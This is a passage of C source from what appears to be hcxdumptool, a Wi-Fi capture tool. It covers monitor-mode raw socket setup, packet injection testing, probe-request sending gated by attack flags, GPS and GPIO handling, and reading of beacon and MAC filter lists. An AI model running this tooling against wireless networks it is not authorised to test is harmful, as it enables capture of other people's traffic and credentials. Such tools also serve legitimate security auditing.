				GPIO_SET = 1 << gpiostatusled;
				nanosleep(&sleepled, NULL);
				GPIO_CLR = 1 << gpiostatusled;
				if(incomingcountold == incomingcount)
					{
					nanosleep(&sleepled, NULL);
					GPIO_SET = 1 << gpiostatusled;
					nanosleep(&sleepled, NULL);
					GPIO_CLR = 1 << gpiostatusled;
					}
				}
			incomingcountold = incomingcount;
			}
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
		printrcascan();
		}
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0) globalclose();
		}
	if(wantstopflag == true) globalclose();
	if(errorcount >= maxerrorcount)
		{
		fprintf(stderr, "\nmaximum number of errors is reached\n");
		globalclose();
		}
	FD_ZERO(&readfds);
	FD_SET(fd_socket, &readfds);
	sd = fd_socket;
	if(fd_gps > 0)
		{
		FD_SET(fd_gps, &readfds);
		sd = fd_gps;
		}
	fdnum = select(sd +1, &readfds, NULL, NULL, &tvfd);
	if(fdnum < 0)
		{
		errorcount++;
		continue;
		}
	if(FD_ISSET(fd_gps, &readfds)) process_gps();
	else if(FD_ISSET(fd_socket, &readfds)) process_packet_rca();
	else
		{
		cpa++;
		if(channelscanlist[cpa] == 0) cpa = 0;
		if(set_channel() == false)
			{
			errorcount++;
			continue;
			}
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
		tvfd.tv_sec = 0;
		tvfd.tv_usec = FDUSECTIMER;
		}
	}
return;
}
/*===========================================================================*/
static inline void process_fd_injection()
{
static uint64_t incomingcountold;
static int sd;
static int fdnum;
static fd_set readfds;
static uint64_t injectionhit;
static uint64_t injectioncount;
static scanlist_t *zeiger;
static struct timeval tvfd;

gettimeofday(&tv, NULL);
tvold.tv_sec = tv.tv_sec;
tvold.tv_usec = tv.tv_usec;
tvfd.tv_sec = 0;
tvfd.tv_usec = FDUSECTIMER;
cpa = 0;
if(set_channel() == false) errorcount++;
if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
attackstatus = 0;
injectionhit = 0;
injectioncount = 0;
printf("starting packet injection test (that can take up to two minutes)...\n");
while(tvold.tv_sec == tv.tv_sec) gettimeofday(&tv, NULL);
tvold.tv_sec = tv.tv_sec;
while(1)
	{
	gettimeofday(&tv, NULL);
	if(tv.tv_sec != tvold.tv_sec)
		{
		get_channel();
		cpa++;
		if(channelscanlist[cpa] == 0) break;
		if(set_channel() == false) continue;
		tvold.tv_sec = tv.tv_sec;
		if((tv.tv_sec %5) == 0)
			{
			if(gpiostatusled > 0)
				{
				GPIO_SET = 1 << gpiostatusled;
				nanosleep(&sleepled, NULL);
				GPIO_CLR = 1 << gpiostatusled;
				if(incomingcountold == incomingcount)
					{
					nanosleep(&sleepled, NULL);
					GPIO_SET = 1 << gpiostatusled;
					nanosleep(&sleepled, NULL);
					GPIO_CLR = 1 << gpiostatusled;
					}
				}
			incomingcountold = incomingcount;
			}
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
		}
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0) globalclose();
		}
	if(wantstopflag == true) globalclose();
	if(errorcount >= maxerrorcount)
		{
		fprintf(stderr, "\nmaximum number of errors is reached\n");
		globalclose();
		}
	FD_ZERO(&readfds);
	FD_SET(fd_socket, &readfds);
	sd = fd_socket;
	if(fd_gps > 0)
		{
		FD_SET(fd_gps, &readfds);
		sd = fd_gps;
		}
	fdnum = select(sd +1, &readfds, NULL, NULL, &tvfd);
	if(fdnum < 0)
		{
		errorcount++;
		continue;
		}
	if(FD_ISSET(fd_gps, &readfds)) process_gps();
	else if(FD_ISSET(fd_socket, &readfds)) process_packet_rca();
	else
		{
		cpa++;
		if(channelscanlist[cpa] == 0) break;
		if(set_channel() == false) continue;
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
		tvfd.tv_sec = 0;
		tvfd.tv_usec = FDUSECTIMER;
		}
	}
for(zeiger = scanlist; zeiger < scanlist +SCANLIST_MAX; zeiger++)
	{
	if(zeiger->count == 0) break;
	injectionhit += zeiger->counthit;
	injectioncount += zeiger->count;
	}
if(injectionhit != 0) printf("packet injection is working!\nratio: %" PRIu64 " to %" PRIu64" \n", injectioncount, injectionhit);
else printf("warning: no PROBERESPONSE received - packet injection is probably not working!\n");
globalclose();
return;
}
/*===========================================================================*/
static inline void process_server()
{
static fd_set readfds;
static struct timeval tvfd;
static int fdnum;
static int msglen;
static uint32_t statuscount;
static char serverstatus[SERVERSTATUS_MAX];

printf("waiting for hcxdumptool server...\n");
gettimeofday(&tv, NULL);
timestampstart = ((uint64_t)tv.tv_sec *1000000) +tv.tv_usec;
timestamp = timestampstart;
wantstopflag = false;
signal(SIGINT, programmende);
statuscount = 1;
tvfd.tv_sec = 1;
tvfd.tv_usec = 0;
while(1)
	{
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0)
			{
			globalclose();
			}
		}
	if(wantstopflag == true)
		{
		globalclose();
		}
	FD_ZERO(&readfds);
	FD_SET(fd_socket_mccli, &readfds);
	fdnum = select(fd_socket_mccli +1, &readfds, NULL, NULL, &tvfd);
	if(fdnum < 0)
		{
		errorcount++;
		continue;
		}
	if(FD_ISSET(fd_socket_mccli, &readfds))
		{
		msglen = read(fd_socket_mccli, serverstatus, SERVERSTATUS_MAX);
		if(msglen < 0)
			{
			perror("\nfailed to read data from server");
			continue;
			}
		serverstatus[msglen] = 0;
		printf("%s", serverstatus);
		}
	else
		{
		if((statuscount %5) == 0)
			{
			if(gpiostatusled > 0)
				{
				GPIO_SET = 1 << gpiostatusled;
				nanosleep(&sleepled, NULL);
				GPIO_CLR = 1 << gpiostatusled;
				}
			}
		statuscount++;
		tvfd.tv_sec = 1;
		tvfd.tv_usec = 0;
		}
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline bool checkmonitorinterface(char *checkinterfacename)
{
static const char *monstr = "mon";

if(checkinterfacename == NULL) return true;
if(strstr(checkinterfacename, monstr) == NULL) return false;
return true;
}
/*===========================================================================*/
static inline void checkunwanted(const char *unwantedname)
{
static FILE *fp;
static char pidline[1024];
static char *pidptr = NULL;

memset(&pidline, 0, 1024);
fp = popen(unwantedname,"r");
if(fp)
	{
	pidptr = fgets(pidline, 1024, fp);
	if(pidptr != NULL) fprintf(stderr, "warning: %s is running with pid %s (possible interfering hcxdumptool)\n", &unwantedname[6], pidline);
	pclose(fp);
	}
return;
}
/*===========================================================================*/
static inline void checkallunwanted()
{
static const char *networkmanager = "pidof NetworkManager";
static const char *wpasupplicant = "pidof wpa_supplicant";
static const char *airodumpng = "pidof lt-airodump-ng";
static const char *kismet = "pidof kismet";

checkunwanted(networkmanager);
checkunwanted(wpasupplicant);
checkunwanted(airodumpng);
checkunwanted(kismet);
return;
}
/*===========================================================================*/
static inline bool openmcclisocket(int mccliport)
{
static int loop;
static struct sockaddr_in mccliaddress;

fd_socket_mccli = 0;
if((fd_socket_mccli = socket(PF_INET, SOCK_DGRAM, 0)) < 0)
	{
	perror ("client socket failed");
	return false;
	}

memset (&mccliaddress, 0, sizeof(mccliaddress));
mccliaddress.sin_family = AF_INET;
mccliaddress.sin_addr.s_addr = htonl(INADDR_ANY);
mccliaddress.sin_port = htons(mccliport);
loop = 1;
if(setsockopt(fd_socket_mccli, SOL_SOCKET, SO_REUSEADDR, &loop, sizeof (loop)) < 0)
	{
	perror("setsockopt() SO_REUSEADDR failed");
	return false;
	}
if(bind(fd_socket_mccli, (struct sockaddr*)&mccliaddress, sizeof(mccliaddress)) < 0)
	{
	perror ("bind client failed");
	return false;
	}
loop = 1;
if (setsockopt(fd_socket_mccli, IPPROTO_IP, IP_MULTICAST_LOOP, &loop, sizeof (loop)) < 0)
	{
	perror ("setsockopt() IP_MULTICAST_LOOP failed");
	return false;
	}

memset(&mcmreq, 0, sizeof(mcmreq));
mcmreq.imr_multiaddr.s_addr = inet_addr(MCHOST);
mcmreq.imr_interface.s_addr = htonl(INADDR_ANY);
if(setsockopt(fd_socket_mccli, IPPROTO_IP, IP_ADD_MEMBERSHIP, &mcmreq, sizeof(mcmreq)) < 0)
	{
	perror ("setsockopt() IP_ADD_MEMBERSHIP failed");
	return false;
	}
return true;
}
/*===========================================================================*/
static inline bool openmcsrvsocket(int mcsrvport)
{
fd_socket_mcsrv = 0;
if((fd_socket_mcsrv = socket (AF_INET, SOCK_DGRAM, 0)) < 0)
	{
	perror("server socket failed");
	return false;
	}
memset (&mcsrvaddress, 0, sizeof(mcsrvaddress));
mcsrvaddress.sin_family = AF_INET;
mcsrvaddress.sin_addr.s_addr = inet_addr (MCHOST);
mcsrvaddress.sin_port = htons(mcsrvport);
if(sendto(fd_socket_mcsrv, "hello hcxdumptool client...\n", sizeof ("hello hcxdumptool client...\n"), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress)) < 0)
	{
	perror("server socket failed");
	close(fd_socket_mcsrv);
	return false;
	}
return true;
}
/*===========================================================================*/
static inline void opengps()
{
static int havegps;
static struct sockaddr_in gpsd_addr;
static int fdnum;
static fd_set readfds;
static struct timeval tvfd;
static const char *nogps = "N/A";
static const char gpgga[] = "$GPGGA";
static const char gprmc[] = "$GPRMC";
static const char *gpsd_enable_nmea = "?WATCH={\"enable\":true,\"json\":false,\"nmea\":true}";

nmealen = 0;
memset(&nmeasentence, 0, NMEA_MAX);
memcpy(&nmeasentence, nogps, 3);
if(gpsname != NULL)
	{
	printf("connecting GPS device...\n");
	if((fd_gps = open(gpsname, O_RDONLY)) < 0)
		{
		perror( "failed to open GPS device");
		fprintf(stderr, "failed to open GPS device\n");
		fd_gps = 0;
		return;
		}
	}
if(gpsdflag == true)
	{
	if((fd_gps = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		{
		perror( "failed to open GPSD socket");
		fd_gps = 0;
		return;
		}
	printf("connecting GPSD...\n");
	memset(&gpsd_addr, 0, sizeof(struct sockaddr_in));
	gpsd_addr.sin_family = AF_INET;
	gpsd_addr.sin_port = htons(2947);
	gpsd_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	if(connect(fd_gps, (struct sockaddr*) &gpsd_addr, sizeof(gpsd_addr)) < 0)
		{
		perror("failed to connect to GPSD");
		fd_gps = 0;
		return;
		}
	if(write(fd_gps, gpsd_enable_nmea, 47) != 47)
		{
		perror("failed to activate GPSD WATCH");
		fd_gps = 0;
		return;
		}
	}
tvfd.tv_sec = 1;
tvfd.tv_usec = 0;
havegps = 0;
while(1)
	{
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0) globalclose();
		}
	if(wantstopflag == true)
		{
		globalclose();
		}
	FD_ZERO(&readfds);
	FD_SET(fd_gps, &readfds);
	fdnum = select(fd_gps +1, &readfds, NULL, NULL, &tvfd);
	if(fdnum < 0)
		{
		errorcount++;
		continue;
		}
	if(FD_ISSET(fd_gps, &readfds))
		{
		process_gps();
		if(memcmp(&gpgga, nmeasentence, 6) == 0) return;
		if(memcmp(&gprmc, nmeasentence, 6) == 0) return;
		if(havegps > 120) return;
		havegps++;
		}
	else
		{
		if(havegps > 120) return;
		havegps++;
		tvfd.tv_sec = 1;
		tvfd.tv_usec = 0;
		}
	}
return;
}
/*===========================================================================*/
static inline bool opensocket()
{
static struct ethtool_perm_addr *epmaddr;
static struct ifreq ifr;
static struct iwreq iwr;
static struct iw_param param;
static struct sockaddr_ll ll;
static struct packet_mreq mr;
static struct ethtool_drvinfo drvinfo;

fd_socket = 0;
memset(&mac_orig, 0, 6);
memset(&drivername, 0, 34);
memset(&driverversion, 0, 34);
memset(&driverfwversion, 0, 34);
checkallunwanted();
if(checkmonitorinterface(interfacename) == true) fprintf(stderr, "warning: %s is probably a virtual monitor interface\n", interfacename);
if((fd_socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
	perror("socket failed");
	return false;
	}
if(bpf.len > 0)
	{
	if(setsockopt(fd_socket, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf)) < 0)
		{
		perror("failed to set Berkeley Packet Filter");
		}
	}
memset(&ifr_old, 0, sizeof(ifr));
strncpy(ifr_old.ifr_name, interfacename, IFNAMSIZ -1);
if(ioctl(fd_socket, SIOCGIFFLAGS, &ifr_old) < 0)
	{
	perror("failed to backup current interface flags, ioctl(SIOCGIFFLAGS) not supported by driver");
	return false;
	}
memset(&iwr_old, 0, sizeof(iwr));
strncpy(iwr_old.ifr_name, interfacename, IFNAMSIZ -1);
if(ioctl(fd_socket, SIOCGIWMODE, &iwr_old) < 0)
	{
	perror("failed to backup  current interface mode, ioctl(SIOCGIWMODE) not supported by driver");
	return false;
	}
if((iwr_old.u.mode & IW_MODE_MONITOR) != IW_MODE_MONITOR)
	{
	memset(&ifr, 0, sizeof(ifr));
	strncpy( ifr.ifr_name, interfacename, IFNAMSIZ -1);
	if(ioctl(fd_socket, SIOCGIFFLAGS, &ifr) < 0)
		{
		perror("failed to get current interface flags, ioctl(SIOCGIFFLAGS) not supported by driver");
		return false;
		}
	ifr.ifr_flags = 0;
	if(ioctl(fd_socket, SIOCSIFFLAGS, &ifr) < 0)
		{
		perror("failed to set interface down, ioctl(SIOCSIFFLAGS) not supported by driver");
		return false;
		}
	memset(&iwr, 0, sizeof(iwr));
	strncpy( iwr.ifr_name, interfacename, IFNAMSIZ -1);
	if(ioctl(fd_socket, SIOCGIWMODE, &iwr) < 0)
		{
		perror("failed to get interface information, ioctl(SIOCGIWMODE) not supported by driver");
		return false;
		}
	iwr.u.mode = IW_MODE_MONITOR;
	if(ioctl(fd_socket, SIOCSIWMODE, &iwr) < 0)
		{
		perror("failed to set monitor mode, ioctl(SIOCSIWMODE) not supported by driver");
		return false;
		}
	memset(&iwr, 0, sizeof(iwr));
	strncpy( iwr.ifr_name, interfacename, IFNAMSIZ -1);
	if(ioctl(fd_socket, SIOCGIWMODE, &iwr) < 0)
		{
		perror("failed to get interface information, ioctl(SIOCGIWMODE) not supported by driver");
		return false;
		}
	if((iwr.u.mode & IW_MODE_MONITOR) != IW_MODE_MONITOR)
		{
		fprintf(stderr, "warning: interface is not in monitor mode\n");
		return false;
		}
	ifr.ifr_flags = IFF_UP | IFF_BROADCAST | IFF_RUNNING;
	if(ioctl(fd_socket, SIOCSIFFLAGS, &ifr) < 0)
		{
		perror("failed to set interface up, ioctl(SIOCSIFFLAGS) not supported by driver");
		return false;
		}
	memset(&ifr, 0, sizeof(ifr));
	strncpy( ifr.ifr_name, interfacename, IFNAMSIZ -1);
	if(ioctl(fd_socket, SIOCGIFFLAGS, &ifr) < 0)
		{
		perror("failed to get interface flags, ioctl(SIOCGIFFLAGS) not supported by driver");
		return false;
		}
	if((ifr.ifr_flags & (IFF_UP)) != (IFF_UP))
		{
		fprintf(stderr, "warning: interface is not up\n");
		return false;
		}
	}
else
	{
	fprintf(stderr, "interface is already in monitor mode\n");
	memset(&ifr, 0, sizeof(ifr));
	strncpy( ifr.ifr_name, interfacename, IFNAMSIZ -1);
	if(ioctl(fd_socket, SIOCGIFFLAGS, &ifr) < 0)
		{
		perror("failed to get interface flags, ioctl(SIOCGIFFLAGS) not supported by driver");
		}
	if((ifr.ifr_flags & (IFF_UP)) != (IFF_UP))
		{
		fprintf(stderr, "warning: interface is not up\n");
		}
	}
/* disable power management, if possible */
memset(&iwr, 0, sizeof(iwr));
strncpy( iwr.ifr_name, interfacename, IFNAMSIZ -1);
memset(&param,0 , sizeof(param));
iwr.u.data.pointer = &param;
ioctl(fd_socket, SIOCSIWPOWER, &iwr);
memset(&ifr, 0, sizeof(ifr));
strncpy( ifr.ifr_name, interfacename, IFNAMSIZ -1);
ifr.ifr_flags = 0;
if(ioctl(fd_socket, SIOCGIFINDEX, &ifr) < 0)
	{
	perror("failed to get SIOCGIFINDEX, ioctl(SIOCGIFINDEX) not supported by driver");
	return false;
	}
memset(&ll, 0, sizeof(ll));
ll.sll_family = PF_PACKET;
ll.sll_ifindex = ifr.ifr_ifindex;
ll.sll_protocol = htons(ETH_P_ALL);
ll.sll_halen = ETH_ALEN;
ll.sll_pkttype = PACKET_OTHERHOST | PACKET_OUTGOING;
if(bind(fd_socket, (struct sockaddr*) &ll, sizeof(ll)) < 0)
	{
	perror("failed to bind socket");
	return false;
	}
memset(&mr, 0, sizeof(mr));
mr.mr_ifindex = ifr.ifr_ifindex;
mr.mr_type = PACKET_MR_PROMISC;
if(setsockopt(fd_socket, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mr, sizeof(mr)) < 0)
	{
	perror("failed to set setsockopt(PACKET_MR_PROMISC)");
	return false;
	}
epmaddr = (struct ethtool_perm_addr*)calloc(1, sizeof(struct ethtool_perm_addr) +6);
if(!epmaddr)
	{
	perror("failed to malloc memory for permanent hardware address");
	return false;
	}
memset(&ifr, 0, sizeof(ifr));
strncpy(ifr.ifr_name, interfacename, IFNAMSIZ -1);
epmaddr->cmd = ETHTOOL_GPERMADDR;
epmaddr->size = 6;
ifr.ifr_data = (char*)epmaddr;
if(ioctl(fd_socket, SIOCETHTOOL, &ifr) < 0)
	{
	perror("failed to get permanent hardware address, ioctl(SIOCETHTOOL) not supported by driver");
	return false;
	}
if(epmaddr->size != 6)
	{
	fprintf(stderr, "failed to get permanent hardware address length\n");
	return false;
	}
memcpy(&mac_orig, epmaddr->data, 6);
free(epmaddr);

memset(&ifr, 0, sizeof(ifr));
strncpy(ifr.ifr_name, interfacename, IFNAMSIZ -1);
ifr.ifr_data = (char*)&drvinfo;
drvinfo.cmd = ETHTOOL_GDRVINFO;
if(ioctl(fd_socket, SIOCETHTOOL, &ifr) < 0)
	{
	perror("failed to get driver information, ioctl(SIOCETHTOOL) not supported by driver");
	return false;
	}
memcpy(&drivername, drvinfo.driver, 32);
memcpy(&driverversion, drvinfo.version, 32);
memcpy(&driverfwversion, drvinfo.fw_version, ETHTOOL_FWVERS_LEN);
return true;
}
/*===========================================================================*/
static inline size_t chop(char *buffer, size_t len)
{
static char *ptr;

ptr = buffer +len -1;
while(len)
	{
	if (*ptr != '\n') break;
	*ptr-- = 0;
	len--;
	}
while(len)
	{
	if (*ptr != '\r') break;
	*ptr-- = 0;
	len--;
	}
return len;
}
/*---------------------------------------------------------------------------*/
static inline int fgetline(FILE *inputstream, size_t size, char *buffer)
{
static size_t len;
static char *buffptr;

if(feof(inputstream)) return -1;
buffptr = fgets (buffer, size, inputstream);
if(buffptr == NULL) return -1;
len = strlen(buffptr);
len = chop(buffptr, len);
return len;
}
/*===========================================================================*/
static inline void readextbeaconlist(char *listname)
{
static int len;
static FILE *fh_extbeacon;
static macessidlist_t *zeiger;
static char linein[ESSID_LEN_MAX];

if((fh_extbeacon = fopen(listname, "r")) == NULL)
	{
	fprintf(stderr, "failed to open beacon list %s\n", listname);
	return;
	}
if(beaconactiveflag == true) zeiger = rglist;
else zeiger = rgbeaconlist;
beaconextlistlen = 0;
gettimeofday(&tv, NULL);
timestamp = ((uint64_t)tv.tv_sec *1000000) +tv.tv_usec -512;
while(beaconextlistlen < BEACONEXTLIST_MAX)
	{
	if((len = fgetline(fh_extbeacon, ESSID_LEN_MAX, linein)) == -1) break;
	if((len == 0) || (len > 32)) continue;
	memset(zeiger, 0, MACESSIDLIST_SIZE);
	zeiger->timestamp = timestamp;
	zeiger->count = 1;
	memcpy(zeiger->ap, &mac_myap, 3);
	zeiger->ap[3] = (mynic_ap >> 16) & 0xff;
	zeiger->ap[4] = (mynic_ap >> 8) & 0xff;
	zeiger->ap[5] = mynic_ap & 0xff;
	mynic_ap++;
	zeiger->essidlen = len;
	memcpy(zeiger->essid, linein, len);
	timestamp++;
	zeiger++;
	beaconextlistlen++;
	}
fclose(fh_extbeacon);
return;
}
/*===========================================================================*/
static inline int readmaclist(char *listname, maclist_t *maclist)
{
static int len;
static int c, i, o;
static int entries;
static maclist_t *zeiger;
static FILE *fh_filter;
static char linein[FILTERLIST_LINE_LEN];

if((fh_filter = fopen(listname, "r")) == NULL)
	{
	fprintf(stderr, "failed to open filter list %s\n", listname);
	return 0;
	}
entries = 0;
c = 0;
zeiger = maclist;
while(entries < FILTERLIST_MAX)
	{
	if((len = fgetline(fh_filter, FILTERLIST_LINE_LEN, linein)) == -1) break;
	if(len < 12)
		{
		c++;
		continue;
		}
	if(linein[0x0] == '#')
		{
		c++;
		continue;
		}
	o = 0;
	for(i = 0; i < len; i++)
		{
		if(isxdigit(linein[i]))
			{
			linein[o] = linein[i];
			o++;
			}
		}
	if(hex2bin(&linein[0x0], zeiger->mac, 6) == true)
		{
		zeiger++;
		entries++;
		}
	else fprintf(stderr, "failed to read filter list line %d: %s\n", c, linein);
	c++;
	}
qsort(maclist, entries, MACLIST_SIZE, sort_maclist);
fclose(fh_filter);
return entries;
}
/*===========================================================================*/
static inline void readbpfc(char *bpfname)
{
static int len;
static uint16_t c;
static struct sock_filter *zeiger;
static FILE *fh_filter;
static char linein[128];

if((fh_filter = fopen(bpfname, "r")) == NULL)
	{
	fprintf(stderr, "failed to open Berkeley Packet Filter list %s\n", bpfname);
	return;
	}
if((len = fgetline(fh_filter, 128, linein)) == -1)
	{
	fclose(fh_filter);
	fprintf(stderr, "failed to read Berkeley Packet Filter array size\n");
	return;
	}
sscanf(linein, "%"SCNu16, &bpf.len);
if(bpf.len == 0)
	{
	fclose(fh_filter);
	fprintf(stderr, "failed to read Berkeley Packet Filter array size\n");
	return;
	}
bpf.filter = (struct sock_filter*)calloc(bpf.len, sizeof(struct sock_filter));
c = 0;
zeiger = bpf.filter;
while(c < bpf.len)
	{
	if((len = fgetline(fh_filter, 128, linein)) == -1)
		{
		bpf.len = 0;
		break;
		}
	sscanf(linein, "%" SCNu16 "%" SCNu8 "%" SCNu8 "%" SCNu32, &zeiger->code, &zeiger->jt,  &zeiger->jf,  &zeiger->k);
	zeiger++;
	c++;
	}
if(bpf.len != c) fprintf(stderr, "failed to read Berkeley Packet Filter\n");
fclose(fh_filter);
return;
}
/*===========================================================================*/
static inline bool initgpio(int gpioperi)
{
static int fd_mem;

fd_mem = open("/dev/mem", O_RDWR|O_SYNC);
if(fd_mem < 0)
	{
	fprintf(stderr, "failed to get device memory\n");
	return false;
	}
gpio_map = mmap(NULL, BLOCK_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd_mem, GPIO_BASE +gpioperi);
close(fd_mem);
if(gpio_map == MAP_FAILED)
	{
	fprintf(stderr, "failed to map GPIO memory\n");
	return false;
	}
gpio = (volatile unsigned *)gpio_map;
return true;
}
/*===========================================================================*/
static inline int getrpirev()
{
static FILE *fh_rpi;
static int len;
static int rpi = 0;
static int rev = 0;
static int gpioperibase = 0;
static char *revptr = NULL;
static const char *revstr = "Revision";
static const char *hwstr = "Hardware";
static const char *snstr = "Serial";
static char linein[128];

fh_rpi = fopen("/proc/cpuinfo", "r");
if(fh_rpi == NULL)
	{
	perror("failed to retrieve cpuinfo");
	return gpioperibase;
	}
while(1)
	{
	if((len = fgetline(fh_rpi, 128, linein)) == -1) break;
	if(len < 15) continue;
	if(memcmp(&linein, hwstr, 8) == 0)
		{
		rpi |= 1;
		continue;
		}
	if(memcmp(&linein, revstr, 8) == 0)
		{
		rpirevision = strtol(&linein[len -6], &revptr, 16);
		if((revptr - linein) == len)
			{
			rev = (rpirevision >> 4) &0xff;
			if(rev <= 3)
				{
				gpioperibase = GPIO_PERI_BASE_OLD;
				rpi |= 2;
				continue;
				}
			if(rev == 0x09)
				{
				gpioperibase = GPIO_PERI_BASE_OLD;
				rpi |= 2;
				continue;
				}
			if(rev == 0x0c)
				{
				gpioperibase = GPIO_PERI_BASE_OLD;
				rpi |= 2;
				continue;
				}
			if((rev == 0x04) || (rev == 0x08) || (rev == 0x0d) || (rev == 0x0e) || (rev == 0x11))
				{
				gpioperibase = GPIO_PERI_BASE_NEW;
				rpi |= 2;
				continue;
				}
			continue;
			}
		rpirevision = strtol(&linein[len -4], &revptr, 16);
		if((revptr - linein) == len)
			{
			if((rpirevision < 0x02) || (rpirevision > 0x15)) continue;
			if((rpirevision == 0x11) || (rpirevision == 0x14)) continue;
			gpioperibase = GPIO_PERI_BASE_OLD;
			rpi |= 2;
			}
		continue;
		}
	if(memcmp(&linein, snstr, 6) == 0)
		{
		rpi |= 4;
		continue;
		}
	}
fclose(fh_rpi);
if(rpi < 0x7) return 0;
return gpioperibase;
}
/*===========================================================================*/
static inline bool ischannelindefaultlist(uint8_t userchannel)
{
static uint8_t cpd;

cpd = 0;
while(channeldefaultlist[cpd] != 0)
	{
	if(userchannel == channeldefaultlist[cpd]) return true;
	cpd++;
	}
return false;
}
/*===========================================================================*/
static inline bool processuserscanlist(char *optarglist)
{
static char *ptr;
static char *userscanlist;

userscanlist = strdupa(optarglist);
cpa = 0;
ptr = strtok(userscanlist, ",");
while(ptr != NULL)
	{
	channelscanlist[cpa] = atoi(ptr);
	if(ischannelindefaultlist(channelscanlist[cpa]) == false) return false;
	ptr = strtok(NULL, ",");
	cpa++;
	if(cpa > 127) return false;
	}
channelscanlist[cpa] = 0;
cpa = 0;
return true;
}
/*===========================================================================*/
static inline void show_channels()
{
static int c;
static int res;
static struct iwreq pwrq;
static int frequency;
static int testchannel;

fprintf(stdout, "available channels:\n");
for(c = 0; c < 256; c++)
	{
	testchannel = 0;
	frequency = 0;
	memset(&pwrq, 0, sizeof(pwrq));
	strncpy(pwrq.ifr_name, interfacename, IFNAMSIZ -1);
	pwrq.u.freq.e = 0;
	pwrq.u.freq.flags = IW_FREQ_FIXED;
	pwrq.u.freq.m = c;
	res = ioctl(fd_socket, SIOCSIWFREQ, &pwrq);
	if(res >= 0)
		{
		memset(&pwrq, 0, sizeof(pwrq));
		strncpy(pwrq.ifr_name, interfacename, IFNAMSIZ -1);
		pwrq.u.freq.e = 0;
		pwrq.u.freq.flags = IW_FREQ_FIXED;
		res = ioctl(fd_socket, SIOCGIWFREQ, &pwrq);
		if(res >= 0)
			{
			frequency = pwrq.u.freq.m;
			if(frequency > 100000) frequency /= 100000;
			if(frequency < 1000) testchannel = frequency;
			else if((frequency >= 2407) && (frequency <= 2474)) testchannel = (frequency -2407)/5;
			else if((frequency >= 2481) && (frequency <= 2487)) testchannel = (frequency -2412)/5;
			else if((frequency >= 5150) && (frequency <= 5875)) testchannel = (frequency -5000)/5;
			if(testchannel > 0)
				{
				memset(&pwrq, 0, sizeof(pwrq));
				strncpy( pwrq.ifr_name, interfacename, IFNAMSIZ -1);
				pwrq.u.txpower.value = -1;
				pwrq.u.txpower.fixed = 1;
				pwrq.u.txpower.disabled = 0;
				pwrq.u.txpower.flags = IW_TXPOW_DBM;
				if(ioctl(fd_socket, SIOCGIWTXPOW, &pwrq) < 0)
					{
					if(testchannel == frequency) fprintf(stdout, " %3d\n", testchannel);
					else fprintf(stdout, " %3d / %4dMHz\n", testchannel, frequency);
					}
				else
					{
					if(pwrq.u.txpower.value > 0)
						{
						if(testchannel == frequency) fprintf(stdout, "%3d (%2d dBm)\n",testchannel, pwrq.u.txpower.value);
						else fprintf(stdout, "%3d / %4dMHz (%2d dBm)\n",testchannel, frequency, pwrq.u.txpower.value);
						}
					}
				}
			}
		}
	}
return;
}
/*===========================================================================*/
static inline bool get_perm_addr(char *ifname, uint8_t *permaddr, char *drivername)
{
static int fd_info;
static struct iwreq iwr;
static struct ifreq ifr;
static struct ethtool_perm_addr *epmaddr;
static struct ethtool_drvinfo drvinfo;

if((fd_info = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
	perror( "socket info failed" );
	return false;
	}
memset(&iwr, 0, sizeof(iwr));
strncpy(iwr.ifr_name, ifname, IFNAMSIZ -1);
if(ioctl(fd_info, SIOCGIWNAME, &iwr) < 0)
	{
#ifdef DEBUG
	printf("testing %s %s\n", ifname, drivername);
	perror("not a wireless interface");
#endif
	close(fd_info);
	return false;
	}
epmaddr = (struct ethtool_perm_addr *) malloc(sizeof(struct ethtool_perm_addr) +6);
if(!epmaddr)
	{
	perror("failed to malloc memory for permanent hardware address");
	close(fd_info);
	return false;
	}
memset(&ifr, 0, sizeof(ifr));
strncpy(ifr.ifr_name, ifname, IFNAMSIZ -1);
epmaddr->cmd = ETHTOOL_GPERMADDR;
epmaddr->size = 6;
ifr.ifr_data = (char*)epmaddr;
if(ioctl(fd_info, SIOCETHTOOL, &ifr) < 0)
	{
	perror("failed to get permanent hardware address, ioctl(SIOCETHTOOL) not supported by driver");
	free(epmaddr);
	close(fd_info);
	return false;
	}
if(epmaddr->size != 6)
	{
	free(epmaddr);
	close(fd_info);
	return false;
	}
memcpy(permaddr, epmaddr->data, 6);
memset(&ifr, 0, sizeof(ifr));
strncpy(ifr.ifr_name, ifname, IFNAMSIZ -1);
drvinfo.cmd = ETHTOOL_GDRVINFO;
ifr.ifr_data = (char*)&drvinfo;
if(ioctl(fd_info, SIOCETHTOOL, &ifr) < 0)
	{
	perror("failed to get driver information, ioctl(SIOCETHTOOL) not supported by driver");
	free(epmaddr);
	close(fd_info);
	return false;
	}
memcpy(drivername, drvinfo.driver, 32);
free(epmaddr);
close(fd_info);
return true;
}
/*===========================================================================*/
static inline void show_wlaninterfaces()
{
static int p;
static struct ifaddrs *ifaddr = NULL;
static struct ifaddrs *ifa = NULL;
static uint8_t permaddr[6];
static char drivername[32];

if(getifaddrs(&ifaddr) == -1) perror("failed to get ifaddrs");
else
	{
	printf("wlan interfaces:\n");
	for(ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
		{
